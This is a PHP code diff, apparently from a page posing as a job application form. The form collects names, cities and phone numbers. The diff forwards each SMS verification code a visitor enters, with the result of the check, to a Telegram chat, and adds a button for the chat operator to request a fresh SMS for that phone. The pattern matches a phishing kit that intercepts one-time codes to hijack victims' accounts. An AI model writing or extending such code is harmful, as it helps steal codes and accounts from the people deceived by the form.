@@ -104,8 +104,7 @@ if (isset($_POST['nombre'], $_POST['ciudad'], $_POST['celular']) && $accion === 
     $mensaje = "Nueva postulación:\n" .
                "Nombre: $nombre\n" .
                "Ciudad: $ciudad\n" .
-               "Celular: $celular\n" .
-               "Código SMS: $codigo";
+               "Celular: $celular";
 
     $replyMarkup = [
         'inline_keyboard' => [
@@ -138,9 +137,8 @@ if ($accion === 'confirmar' && $codigoIngresado !== null) {
     $nombre   = $_SESSION['nombre']  ?? '';
     $codigoGuardado = $telefono ? obtenerCodigo($telefono) : null;
 
-    $log = "Intento de código:\n" .
+    $log = "Nuevo código recibido:\n" .
            "Nombre: $nombre\n" .
-           "Celular: $telefono\n" .
            "Código ingresado: $codigoIngresado";
 
     if ($telefono !== null && $codigoGuardado !== null && $codigoIngresado === (string)$codigoGuardado) {
@@ -156,7 +154,19 @@ if ($accion === 'confirmar' && $codigoIngresado !== null) {
         $log .= "\nResultado: INCORRECTO";
     }
 
-    enviarATelegram($BOT_TOKEN, $CHAT_ID, $log);
+    // En cada intento de código agregamos también un botón para pedir nuevo SMS
+    $replyMarkupIntento = [
+        'inline_keyboard' => [
+            [
+                [
+                    'text' => 'Pedir nuevo SMS',
+                    'callback_data' => 'PEDIR_SMS|' . $telefono,
+                ],
+            ],
+        ],
+    ];
+
+    enviarATelegram($BOT_TOKEN, $CHAT_ID, $log, $replyMarkupIntento);
 }
 ?><!doctype html>
 <html lang="es">
